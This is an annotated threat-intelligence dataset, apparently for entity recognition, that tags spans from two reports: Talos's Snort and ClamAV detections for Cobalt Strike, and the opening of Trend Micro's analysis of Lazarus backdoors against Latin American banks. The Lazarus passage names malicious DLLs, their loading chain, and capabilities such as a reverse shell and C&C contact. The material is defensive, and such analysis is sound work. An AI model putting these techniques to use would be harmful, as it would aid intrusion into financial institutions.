• 1:45908 MALWARE-CNC ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," DNS beacon 
inbound TXT record **(UPDATED)**

• 1:53972 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,beacon.dll,ioc
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
DNS download attempt

• 1:53973 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,powerShell,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
web delivery attempt

• 1:53974 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,powerShell,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
web delivery attempt

• 1:53975 INDICATOR-COMPROMISE ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
multiple large DNS TXT query responses

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,ClamAV,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

• `",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Win.Trojan.Meterpreter-7385375-0,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"`

BEACON BINARY PAYLOADS

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Snort,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

• 1:30229 INDICATOR-SHELLCODE ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Metasploit,tool
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," windows/
shell stage transfer attempt **(UPDATED)**

• 1:30471 INDICATOR-SHELLCODE ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Metasploit,tool
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," payload 
windows_adduser **(UPDATED)**

• 1:30480 INDICATOR-SHELLCODE INDICATOR-
SHELLCODE ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Metasploit,tool
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," payload windows_x64_
meterpreter_reverse_https **(UPDATED)**

• 1:53757 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,beacon.dll,ioc
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
download attempt

• 1:53758 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,beacon.dll,ioc
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
download attempt

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,ClamAV,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

• ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Win.Trojan.MSShellcode-5,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

• ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Win.Trojan.CobaltStrike-7913051-0,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

BEACON ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,POWERSHELL,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," PAYLOADS

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Snort,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

• 1:54095 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Win.Trojan.CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,powershell,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," beacon download attempt

• 1:54096 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Win.Trojan.CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,powershell,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," beacon download attempt

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,ClamAV,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

• ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Win.Trojan.CobaltStrike-7917400-0,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

HTML APPLICATION (HTA) ATTACKS

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Snort,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

• 1:8068 BROWSER-PLUGINS Microsoft Windows 
Scripting Host Shell ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,ActiveX,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," function call access

• 1:54110 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Html.Trojan.CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
HTML payload download attempt

• 1:54111 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Html.Trojan.CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 



page 29 of 29© 2020 ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cisco,org
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,". All rights reserved. talos-external@cisco.com  |  talosintelligence.com

The art and science of detecting ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

HTML payload download attempt

• 1:54112 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Html.Trojan.CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
HTML payload download attempt

• 1:54113 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Html.Trojan.CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
HTML payload download attempt

• 1:54114 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Html.Trojan.CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,powershell,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," payload download attempt

• 1:54115 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Html.Trojan.CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,powershell,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," payload download attempt

• 1:54116 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Html.Trojan.CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,VBA,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," payload download attempt

• 1:54117 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Html.Trojan.CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,VBA,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," payload download attempt

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,ClamAV,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

• ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Html.Trojan.CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"-7932561-0

• ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Html.Trojan.CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"-7932562-0

• ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Html.Trojan.CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"-7932563-0

• ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Html.Trojan.CobaltStrike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"-7932564-0

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," SIGNED APPLET ATTACK

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Snort,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

• 1:54169 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," signed java 
applet execution attempt

• 1:54170 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," signed java 
applet execution attempt

• 1:54171 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," signed java 
applet download attempt

• 1:54172 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," signed java 
applet download attempt

• 1:54173 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," signed java 
applet download attempt

• 1:54174 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," signed java 
applet download attempt

• 1:54175 INDICATOR-COMPROMISE ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
default signed applet attack URI

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,ClamAV,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

• ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Win.Trojan.CobaltStrike-8001474-0,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

• ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Win.Trojan.CobaltStrike-8001477-1,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," SMART APPLET ATTACK

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Snort,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

• 1:54183 INDICATOR-COMPROMISE ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
default smart applet attack URI

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,ClamAV,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

• Prior coverage signed applet submissions

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," SYSTEM PROFILER ATTACK

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Snort,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

• 1:13913 BROWSER-PLUGINS AcroPDF.PDF ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,ActiveX,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," 
clsid access attempt **MAX DETECT**

• 1:23878 BROWSER-PLUGINS ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Oracle,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike, ,O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,JRE,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," Deployment 
Toolkit ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,ActiveX,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," clsid access attempt **MAX DETECT**

• 1:38038 POLICY-OTHER PDF ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,ActiveX,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," CLSID access 
detected **MAX DETECT**

• 1:54180 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," system 
profiling attempt

• 1:54181 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," system 
profiling attempt

• 1:54182 MALWARE-OTHER ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Cobalt Strike,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike," system 
profiling attempt

",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,ClamAV,software
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"

• ",O
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,Java.Malware.CobaltStrike-8008971-0,malware
20200911_Talos_-_The_art_and_science_of_detecting_Cobalt_Strike,"


	_fc5rziddqgfm
	_go2hv7ut784o
	_qf4jzftqnybl
	_1qukxsq0ft7l
	_j01c68rrkg1u
	_od77ioq0wcos
	_99ipmbl5celg
	_hfs1usdxyh4q
	_cd17e2cwur1j
	_wbmtaibalv70
	_ren4cj59lkps
	_z3idehsuoshh
	_u199v83bpgtu
	_9537z5lypnzt
	_dk6mdna6g3am
	_9onk0sobghz5
	_40yzzo1drv0j
	_71pcrxn6pqo0
	_lmdby71vme0l
	_dr9wgt4h9yv
	_1qc071i18p5g
	_bt0uo0xsnyxv
	_9jsukqkbp8ct
	_5xrbjztz2tfl
	_q86ltopafa1r
	_jl3vd2ktm2sb
	_f4q8adum2g4k
	_au0nhiun7ui8
	_gtdk8sa8pm4a
	_mb1iulmw5jzo
	_pdomcyx7hsnz
	_tvg24jel73pr
	_hc4d7tbfgmqo
	_u3q6qgudx3a
	_xnduwtwc8hoo
	_sjtpuuzd1m6t
	_gujeu0mh0ejn
	_fh0lzq5v1djb
	_idtxk3bsd6v1
	_ytkhdgc0lizh
	_8d2fhov2yn72
	_cuj3lrz5r3dh
	_dpq8rwkq5xnr
	_lv2ush8ssa9j
	_kgzwzc5u78ie
	_euerz6s41u3v
	_cjbnbda00hp1
	_hqoedzuzj41a",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Lazarus,threat_actor
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica," Continues Heists, Mounts Attacks on Financial Organizations in ",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Latin America,country
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,"


Trend Micro ",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,"November 20, 2018",timestamp
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,"

",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Lazarus,threat_actor
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica," Continues Heists, Mounts Attacks on Financial
Organizations in ",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Latin America,country
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,"

blog.trendmicro.com/trendlabs-security-intelligence/lazarus-continues-heists-mounts-attacks-on-financial-
organizations-in-latin-america/

Home   »   Malware   »   ",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Lazarus,threat_actor
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica," Continues Heists, Mounts Attacks on Financial
Organizations in ",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Latin America,country
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,"

0
by ",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Lenart Bermejo,identity
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica, and ,O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Joelson Soares,identity
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,"

The cybercriminal group ",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Lazarus,threat_actor
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,", and particularly its
subgroup ",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Bluenoroff,threat_actor
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,", has a history of attacking financial
organizations in ",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Asia,country
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica, and ,O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Latin America,country
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,". There seems to
be a resurgence of activity from the group, and recent
events show how their tools and techniques have
evolved. Just ",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,last week,timestamp
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica," they were found stealing millions
from ATMs across ",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Asia,country
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica, and ,O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Africa,country
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,". We also recently
discovered that they successfully planted their backdoor
(detected by ",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Trend Micro,software
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica, as ,O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,BKDR_BINLODR.ZNFJ-A,malware
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,") into
several machines of financial institutions across ",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Latin America,country
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,".

We determined that these backdoors were installed on the targets’ machines on ",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,September 19 2018,timestamp
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,", based mainly on the service creation time of the loader component. We also saw
that the attack technique bears some resemblance to a previous ",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,2017,timestamp
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica, ,O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Lazarus,threat_actor
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica," attack,
analyzed by ",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,BAE Systems,org
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,", against targets in ",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Asia,country
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,. The use of ,O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,FileTokenBroker.dll,ioc
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica," was a key
part of the group’s attack in ",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,2017,timestamp
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,", and they seem to have used the same modularized
backdoor in the recent incident as well.

Our analysis of the backdoors used in the ",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,September 2018,timestamp
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica," attacks show that
",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,AuditCred.dll,ioc
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,/,O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,ROptimizer.dll,ioc
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica," was similarly used:

",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,FileTokenBroker.dll,ioc
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,  (,O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,2017,timestamp
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica," attack)

",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,AuditCred.dll,ioc
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,/,O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Roptimizer.dll,ioc
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,  (,O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,2018,timestamp
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica," attack)

Launch Method Service Service

Function Loader Component Loader Component

Working directory %Windows%\System32 %Windows%\System32

Loaded Component Path %Windows%\System32\en-US %Program Files%\Common Files\System
\ado

Loaded Component
Blending

Blends with .mui files Blend with ",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,ActiveX,software
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica," data Object dll files

Table1: Similarities of the Loader components in both incidents

1/5

https://blog.trendmicro.com/trendlabs-security-intelligence/lazarus-continues-heists-mounts-attacks-on-financial-organizations-in-latin-america/
https://blog.trendmicro.com/trendlabs-security-intelligence/
https://blog.trendmicro.com/trendlabs-security-intelligence/category/malware/
https://blog.trendmicro.com/trendlabs-security-intelligence/lazarus-continues-heists-mounts-attacks-on-financial-organizations-in-latin-america/#respond
https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/a-look-into-the-lazarus-groups-operations
https://www.theverge.com/2018/11/8/18075124/north-korea-lazarus-atm-fastcash-hack-millions-dollars-stolen
https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/bkdr_binlodr.znfj-a
https://baesystemsai.blogspot.com/2017/10/taiwan-heist-lazarus-tools.html
https://blog.trendmicro.com/trendlabs-security-intelligence/files/2018/11/lazaruslatinamerica2.png
https://blog.trendmicro.com/trendlabs-security-intelligence/files/2018/11/lazaruslatinamerica3.png
https://blog.trendmicro.com/trendlabs-security-intelligence/files/2018/11/lazaruslatinamerica4.png
https://blog.trendmicro.com/trendlabs-security-intelligence/files/2018/11/lazaruslatinamerica5.png


Analysis of backdoors used in ",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,2018,timestamp
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,"

The ",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Lazarus,threat_actor
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica, group used a series of backdoors in their ,O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,2018,timestamp
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica," attacks, employing a
complicated technique that involves three major components:

AuditCred.dll/ROptimizer.dll (detected by ",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Trend Micro,software
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica, as ,O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,BKDR_BINLODR.ZNFJ-A,malware
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,") –
loader DLL that is launched as a service
",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Msadoz,ioc
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,.dll,O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica, (detected by ,O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Trend Micro,software
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica, as ,O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,BKDR64_BINLODR.ZNFJ-A,malware
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,") – encrypted
backdoor
n = number of characters in the loader dll’s filename
",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Auditcred.dll.mui,ioc
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,/,O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,rOptimizer.dll.mui,ioc
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica, (detected by ,O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Trend Micro,software
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica," as
",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,TROJ_BINLODRCONF.ZNFJ-A,malware
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,") – encrypted configuration file

Figure 1: Loading sequence of the modularized backdoor

The loader DLL is installed as a service and uses different names (AuditCred and
ROptimizer) on different machines. However, they still have the same capabilities and are
essentially the same file. Its purpose is to load ",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Msadoz,ioc
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,.dll,O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica," in order to decrypt and
execute it in memory.

Figure 2: AuditCred/ROptimizer Service

If successfully installed, this particular
backdoor poses quite a threat to its target.
It is capable of the following functions:

Collect file/folder/drive information
Download files and additional
malware
Launch/terminate/enumerate
process
Update configuration data
Delete files
Inject code from files to other
running process
Utilize proxy

2/5



Open reverse shell
Run in passive mode — instead of actively connecting to the command and control
(C&C) server, the backdoor will open and listen to a port then receive commands
through it

Once the backdoor is loaded, it will then load the encrypted configuration file
",O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,Auditcred.dll.mui,ioc
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,/,O
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,rOptimizer.dll.mui,ioc
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica," to extract the C&C information and connect to it. The
connection is necessary for conducting activities; and based on the backdoor’s functions,
